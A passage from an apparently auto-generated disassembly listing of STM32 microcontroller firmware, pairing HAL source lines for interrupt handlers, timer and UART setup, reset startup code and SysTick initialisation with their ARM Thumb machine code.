 8000df2:	4770      	bx	lr

08000df4 <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 8000df4:	b580      	push	{r7, lr}
 8000df6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8000df8:	f000 f9b2 	bl	8001160 <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 8000dfc:	bf00      	nop
 8000dfe:	bd80      	pop	{r7, pc}

08000e00 <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8000e00:	b580      	push	{r7, lr}
 8000e02:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 8000e04:	4802      	ldr	r0, [pc, #8]	; (8000e10 <TIM2_IRQHandler+0x10>)
 8000e06:	f003 ffc1 	bl	8004d8c <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8000e0a:	bf00      	nop
 8000e0c:	bd80      	pop	{r7, pc}
 8000e0e:	bf00      	nop
 8000e10:	200002e4 	.word	0x200002e4

08000e14 <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 8000e14:	b580      	push	{r7, lr}
 8000e16:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8000e18:	4802      	ldr	r0, [pc, #8]	; (8000e24 <USB_IRQHandler+0x10>)
 8000e1a:	f001 f819 	bl	8001e50 <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8000e1e:	bf00      	nop
 8000e20:	bd80      	pop	{r7, pc}
 8000e22:	bf00      	nop
 8000e24:	20000b7c 	.word	0x20000b7c

08000e28 <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 8000e28:	b480      	push	{r7}
 8000e2a:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8000e2c:	4b06      	ldr	r3, [pc, #24]	; (8000e48 <SystemInit+0x20>)
 8000e2e:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8000e32:	4a05      	ldr	r2, [pc, #20]	; (8000e48 <SystemInit+0x20>)
 8000e34:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 8000e38:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 8000e3c:	bf00      	nop
 8000e3e:	46bd      	mov	sp, r7
 8000e40:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e44:	4770      	bx	lr
 8000e46:	bf00      	nop
 8000e48:	e000ed00 	.word	0xe000ed00

08000e4c <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 8000e4c:	b580      	push	{r7, lr}
 8000e4e:	b088      	sub	sp, #32
 8000e50:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 8000e52:	f107 0310 	add.w	r3, r7, #16
 8000e56:	2200      	movs	r2, #0
 8000e58:	601a      	str	r2, [r3, #0]
 8000e5a:	605a      	str	r2, [r3, #4]
 8000e5c:	609a      	str	r2, [r3, #8]
 8000e5e:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8000e60:	1d3b      	adds	r3, r7, #4
 8000e62:	2200      	movs	r2, #0
 8000e64:	601a      	str	r2, [r3, #0]
 8000e66:	605a      	str	r2, [r3, #4]
 8000e68:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 8000e6a:	4b1e      	ldr	r3, [pc, #120]	; (8000ee4 <MX_TIM2_Init+0x98>)
 8000e6c:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000e70:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 8000e72:	4b1c      	ldr	r3, [pc, #112]	; (8000ee4 <MX_TIM2_Init+0x98>)
 8000e74:	f641 421f 	movw	r2, #7199	; 0x1c1f
 8000e78:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 8000e7a:	4b1a      	ldr	r3, [pc, #104]	; (8000ee4 <MX_TIM2_Init+0x98>)
 8000e7c:	2200      	movs	r2, #0
 8000e7e:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8000e80:	4b18      	ldr	r3, [pc, #96]	; (8000ee4 <MX_TIM2_Init+0x98>)
 8000e82:	f240 128f 	movw	r2, #399	; 0x18f
 8000e86:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 8000e88:	4b16      	ldr	r3, [pc, #88]	; (8000ee4 <MX_TIM2_Init+0x98>)
 8000e8a:	2200      	movs	r2, #0
 8000e8c:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 8000e8e:	4b15      	ldr	r3, [pc, #84]	; (8000ee4 <MX_TIM2_Init+0x98>)
 8000e90:	2200      	movs	r2, #0
 8000e92:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 8000e94:	4813      	ldr	r0, [pc, #76]	; (8000ee4 <MX_TIM2_Init+0x98>)
 8000e96:	f003 fece 	bl	8004c36 <HAL_TIM_Base_Init>
 8000e9a:	4603      	mov	r3, r0
 8000e9c:	2b00      	cmp	r3, #0
 8000e9e:	d001      	beq.n	8000ea4 <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8000ea0:	f7ff feda 	bl	8000c58 <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 8000ea4:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8000ea8:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 8000eaa:	f107 0310 	add.w	r3, r7, #16
 8000eae:	4619      	mov	r1, r3
 8000eb0:	480c      	ldr	r0, [pc, #48]	; (8000ee4 <MX_TIM2_Init+0x98>)
 8000eb2:	f004 f86d 	bl	8004f90 <HAL_TIM_ConfigClockSource>
 8000eb6:	4603      	mov	r3, r0
 8000eb8:	2b00      	cmp	r3, #0
 8000eba:	d001      	beq.n	8000ec0 <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 8000ebc:	f7ff fecc 	bl	8000c58 <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 8000ec0:	2300      	movs	r3, #0
 8000ec2:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 8000ec4:	2300      	movs	r3, #0
 8000ec6:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 8000ec8:	1d3b      	adds	r3, r7, #4
 8000eca:	4619      	mov	r1, r3
 8000ecc:	4805      	ldr	r0, [pc, #20]	; (8000ee4 <MX_TIM2_Init+0x98>)
 8000ece:	f004 fa4f 	bl	8005370 <HAL_TIMEx_MasterConfigSynchronization>
 8000ed2:	4603      	mov	r3, r0
 8000ed4:	2b00      	cmp	r3, #0
 8000ed6:	d001      	beq.n	8000edc <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 8000ed8:	f7ff febe 	bl	8000c58 <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 8000edc:	bf00      	nop
 8000ede:	3720      	adds	r7, #32
 8000ee0:	46bd      	mov	sp, r7
 8000ee2:	bd80      	pop	{r7, pc}
 8000ee4:	200002e4 	.word	0x200002e4

08000ee8 <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 8000ee8:	b580      	push	{r7, lr}
 8000eea:	b084      	sub	sp, #16
 8000eec:	af00      	add	r7, sp, #0
 8000eee:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 8000ef0:	687b      	ldr	r3, [r7, #4]
 8000ef2:	681b      	ldr	r3, [r3, #0]
 8000ef4:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8000ef8:	d113      	bne.n	8000f22 <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 8000efa:	4b0c      	ldr	r3, [pc, #48]	; (8000f2c <HAL_TIM_Base_MspInit+0x44>)
 8000efc:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000efe:	4a0b      	ldr	r2, [pc, #44]	; (8000f2c <HAL_TIM_Base_MspInit+0x44>)
 8000f00:	f043 0301 	orr.w	r3, r3, #1
 8000f04:	6593      	str	r3, [r2, #88]	; 0x58
 8000f06:	4b09      	ldr	r3, [pc, #36]	; (8000f2c <HAL_TIM_Base_MspInit+0x44>)
 8000f08:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f0a:	f003 0301 	and.w	r3, r3, #1
 8000f0e:	60fb      	str	r3, [r7, #12]
 8000f10:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 8000f12:	2200      	movs	r2, #0
 8000f14:	2100      	movs	r1, #0
 8000f16:	201c      	movs	r0, #28
 8000f18:	f000 fa41 	bl	800139e <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8000f1c:	201c      	movs	r0, #28
 8000f1e:	f000 fa5a 	bl	80013d6 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 8000f22:	bf00      	nop
 8000f24:	3710      	adds	r7, #16
 8000f26:	46bd      	mov	sp, r7
 8000f28:	bd80      	pop	{r7, pc}
 8000f2a:	bf00      	nop
 8000f2c:	40021000 	.word	0x40021000

08000f30 <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8000f30:	b580      	push	{r7, lr}
 8000f32:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 8000f34:	4b14      	ldr	r3, [pc, #80]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f36:	4a15      	ldr	r2, [pc, #84]	; (8000f8c <MX_USART2_UART_Init+0x5c>)
 8000f38:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 8000f3a:	4b13      	ldr	r3, [pc, #76]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f3c:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 8000f40:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 8000f42:	4b11      	ldr	r3, [pc, #68]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f44:	2200      	movs	r2, #0
 8000f46:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 8000f48:	4b0f      	ldr	r3, [pc, #60]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f4a:	2200      	movs	r2, #0
 8000f4c:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 8000f4e:	4b0e      	ldr	r3, [pc, #56]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f50:	2200      	movs	r2, #0
 8000f52:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 8000f54:	4b0c      	ldr	r3, [pc, #48]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f56:	220c      	movs	r2, #12
 8000f58:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 8000f5a:	4b0b      	ldr	r3, [pc, #44]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f5c:	2200      	movs	r2, #0
 8000f5e:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8000f60:	4b09      	ldr	r3, [pc, #36]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f62:	2200      	movs	r2, #0
 8000f64:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 8000f66:	4b08      	ldr	r3, [pc, #32]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f68:	2200      	movs	r2, #0
 8000f6a:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 8000f6c:	4b06      	ldr	r3, [pc, #24]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f6e:	2200      	movs	r2, #0
 8000f70:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 8000f72:	4805      	ldr	r0, [pc, #20]	; (8000f88 <MX_USART2_UART_Init+0x58>)
 8000f74:	f004 fa80 	bl	8005478 <HAL_UART_Init>
 8000f78:	4603      	mov	r3, r0
 8000f7a:	2b00      	cmp	r3, #0
 8000f7c:	d001      	beq.n	8000f82 <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 8000f7e:	f7ff fe6b 	bl	8000c58 <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 8000f82:	bf00      	nop
 8000f84:	bd80      	pop	{r7, pc}
 8000f86:	bf00      	nop
 8000f88:	20000330 	.word	0x20000330
 8000f8c:	40004400 	.word	0x40004400

08000f90 <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 8000f90:	b580      	push	{r7, lr}
 8000f92:	b09e      	sub	sp, #120	; 0x78
 8000f94:	af00      	add	r7, sp, #0
 8000f96:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000f98:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8000f9c:	2200      	movs	r2, #0
 8000f9e:	601a      	str	r2, [r3, #0]
 8000fa0:	605a      	str	r2, [r3, #4]
 8000fa2:	609a      	str	r2, [r3, #8]
 8000fa4:	60da      	str	r2, [r3, #12]
 8000fa6:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 8000fa8:	f107 0310 	add.w	r3, r7, #16
 8000fac:	2254      	movs	r2, #84	; 0x54
 8000fae:	2100      	movs	r1, #0
 8000fb0:	4618      	mov	r0, r3
 8000fb2:	f00b ffff 	bl	800cfb4 <memset>
  if(uartHandle->Instance==USART2)
 8000fb6:	687b      	ldr	r3, [r7, #4]
 8000fb8:	681b      	ldr	r3, [r3, #0]
 8000fba:	4a28      	ldr	r2, [pc, #160]	; (800105c <HAL_UART_MspInit+0xcc>)
 8000fbc:	4293      	cmp	r3, r2
 8000fbe:	d148      	bne.n	8001052 <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 8000fc0:	2302      	movs	r3, #2
 8000fc2:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 8000fc4:	2300      	movs	r3, #0
 8000fc6:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 8000fc8:	f107 0310 	add.w	r3, r7, #16
 8000fcc:	4618      	mov	r0, r3
 8000fce:	f003 fa97 	bl	8004500 <HAL_RCCEx_PeriphCLKConfig>
 8000fd2:	4603      	mov	r3, r0
 8000fd4:	2b00      	cmp	r3, #0
 8000fd6:	d001      	beq.n	8000fdc <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 8000fd8:	f7ff fe3e 	bl	8000c58 <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 8000fdc:	4b20      	ldr	r3, [pc, #128]	; (8001060 <HAL_UART_MspInit+0xd0>)
 8000fde:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000fe0:	4a1f      	ldr	r2, [pc, #124]	; (8001060 <HAL_UART_MspInit+0xd0>)
 8000fe2:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8000fe6:	6593      	str	r3, [r2, #88]	; 0x58
 8000fe8:	4b1d      	ldr	r3, [pc, #116]	; (8001060 <HAL_UART_MspInit+0xd0>)
 8000fea:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000fec:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8000ff0:	60fb      	str	r3, [r7, #12]
 8000ff2:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000ff4:	4b1a      	ldr	r3, [pc, #104]	; (8001060 <HAL_UART_MspInit+0xd0>)
 8000ff6:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000ff8:	4a19      	ldr	r2, [pc, #100]	; (8001060 <HAL_UART_MspInit+0xd0>)
 8000ffa:	f043 0301 	orr.w	r3, r3, #1
 8000ffe:	64d3      	str	r3, [r2, #76]	; 0x4c
 8001000:	4b17      	ldr	r3, [pc, #92]	; (8001060 <HAL_UART_MspInit+0xd0>)
 8001002:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001004:	f003 0301 	and.w	r3, r3, #1
 8001008:	60bb      	str	r3, [r7, #8]
 800100a:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 800100c:	2304      	movs	r3, #4
 800100e:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001010:	2302      	movs	r3, #2
 8001012:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001014:	2300      	movs	r3, #0
 8001016:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001018:	2303      	movs	r3, #3
 800101a:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 800101c:	2307      	movs	r3, #7
 800101e:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 8001020:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001024:	4619      	mov	r1, r3
 8001026:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800102a:	f000 fc67 	bl	80018fc <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 800102e:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8001032:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001034:	2302      	movs	r3, #2
 8001036:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001038:	2300      	movs	r3, #0
 800103a:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 800103c:	2303      	movs	r3, #3
 800103e:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 8001040:	2303      	movs	r3, #3
 8001042:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 8001044:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001048:	4619      	mov	r1, r3
 800104a:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800104e:	f000 fc55 	bl	80018fc <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 8001052:	bf00      	nop
 8001054:	3778      	adds	r7, #120	; 0x78
 8001056:	46bd      	mov	sp, r7
 8001058:	bd80      	pop	{r7, pc}
 800105a:	bf00      	nop
 800105c:	40004400 	.word	0x40004400
 8001060:	40021000 	.word	0x40021000

08001064 <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 8001064:	f8df d034 	ldr.w	sp, [pc, #52]	; 800109c <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 8001068:	f7ff fede 	bl	8000e28 <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 800106c:	480c      	ldr	r0, [pc, #48]	; (80010a0 <LoopForever+0x6>)
  ldr r1, =_edata
 800106e:	490d      	ldr	r1, [pc, #52]	; (80010a4 <LoopForever+0xa>)
  ldr r2, =_sidata
 8001070:	4a0d      	ldr	r2, [pc, #52]	; (80010a8 <LoopForever+0xe>)
  movs r3, #0
 8001072:	2300      	movs	r3, #0
  b LoopCopyDataInit
 8001074:	e002      	b.n	800107c <LoopCopyDataInit>

08001076 <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 8001076:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 8001078:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 800107a:	3304      	adds	r3, #4

0800107c <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 800107c:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 800107e:	428c      	cmp	r4, r1
  bcc CopyDataInit
 8001080:	d3f9      	bcc.n	8001076 <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 8001082:	4a0a      	ldr	r2, [pc, #40]	; (80010ac <LoopForever+0x12>)
  ldr r4, =_ebss
 8001084:	4c0a      	ldr	r4, [pc, #40]	; (80010b0 <LoopForever+0x16>)
  movs r3, #0
 8001086:	2300      	movs	r3, #0
  b LoopFillZerobss
 8001088:	e001      	b.n	800108e <LoopFillZerobss>

0800108a <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 800108a:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 800108c:	3204      	adds	r2, #4

0800108e <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 800108e:	42a2      	cmp	r2, r4
  bcc FillZerobss
 8001090:	d3fb      	bcc.n	800108a <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 8001092:	f00b ff97 	bl	800cfc4 <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 8001096:	f7ff fa77 	bl	8000588 <main>

0800109a <LoopForever>:

LoopForever:
    b LoopForever
 800109a:	e7fe      	b.n	800109a <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 800109c:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 80010a0:	20000000 	.word	0x20000000
  ldr r1, =_edata
 80010a4:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 80010a8:	0800d1e8 	.word	0x0800d1e8
  ldr r2, =_sbss
 80010ac:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 80010b0:	20001f14 	.word	0x20001f14

080010b4 <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 80010b4:	e7fe      	b.n	80010b4 <ADC1_IRQHandler>

080010b6 <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 80010b6:	b580      	push	{r7, lr}
 80010b8:	b082      	sub	sp, #8
 80010ba:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 80010bc:	2300      	movs	r3, #0
 80010be:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 80010c0:	2003      	movs	r0, #3
 80010c2:	f000 f961 	bl	8001388 <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 80010c6:	2000      	movs	r0, #0
 80010c8:	f000 f80e 	bl	80010e8 <HAL_InitTick>
 80010cc:	4603      	mov	r3, r0
 80010ce:	2b00      	cmp	r3, #0
 80010d0:	d002      	beq.n	80010d8 <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 80010d2:	2301      	movs	r3, #1
 80010d4:	71fb      	strb	r3, [r7, #7]
 80010d6:	e001      	b.n	80010dc <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 80010d8:	f7ff fe44 	bl	8000d64 <HAL_MspInit>
  }

  /* Return function status */
  return status;
 80010dc:	79fb      	ldrb	r3, [r7, #7]
}
 80010de:	4618      	mov	r0, r3
 80010e0:	3708      	adds	r7, #8
 80010e2:	46bd      	mov	sp, r7
 80010e4:	bd80      	pop	{r7, pc}
	...

080010e8 <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 80010e8:	b580      	push	{r7, lr}
 80010ea:	b084      	sub	sp, #16
 80010ec:	af00      	add	r7, sp, #0
 80010ee:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 80010f0:	2300      	movs	r3, #0
 80010f2:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 80010f4:	4b17      	ldr	r3, [pc, #92]	; (8001154 <HAL_InitTick+0x6c>)
 80010f6:	781b      	ldrb	r3, [r3, #0]
 80010f8:	2b00      	cmp	r3, #0
 80010fa:	d023      	beq.n	8001144 <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 80010fc:	4b16      	ldr	r3, [pc, #88]	; (8001158 <HAL_InitTick+0x70>)
 80010fe:	681a      	ldr	r2, [r3, #0]
 8001100:	4b14      	ldr	r3, [pc, #80]	; (8001154 <HAL_InitTick+0x6c>)
 8001102:	781b      	ldrb	r3, [r3, #0]
 8001104:	4619      	mov	r1, r3
 8001106:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 800110a:	fbb3 f3f1 	udiv	r3, r3, r1
 800110e:	fbb2 f3f3 	udiv	r3, r2, r3
 8001112:	4618      	mov	r0, r3
 8001114:	f000 f96d 	bl	80013f2 <HAL_SYSTICK_Config>
 8001118:	4603      	mov	r3, r0
 800111a:	2b00      	cmp	r3, #0
 800111c:	d10f      	bne.n	800113e <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 800111e:	687b      	ldr	r3, [r7, #4]
 8001120:	2b0f      	cmp	r3, #15
 8001122:	d809      	bhi.n	8001138 <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 8001124:	2200      	movs	r2, #0
 8001126:	6879      	ldr	r1, [r7, #4]
 8001128:	f04f 30ff 	mov.w	r0, #4294967295
 800112c:	f000 f937 	bl	800139e <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 8001130:	4a0a      	ldr	r2, [pc, #40]	; (800115c <HAL_InitTick+0x74>)
 8001132:	687b      	ldr	r3, [r7, #4]
 8001134:	6013      	str	r3, [r2, #0]
 8001136:	e007      	b.n	8001148 <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 8001138:	2301      	movs	r3, #1
 800113a:	73fb      	strb	r3, [r7, #15]
 800113c:	e004      	b.n	8001148 <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 800113e:	2301      	movs	r3, #1
 8001140:	73fb      	strb	r3, [r7, #15]
 8001142:	e001      	b.n	8001148 <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 8001144:	2301      	movs	r3, #1
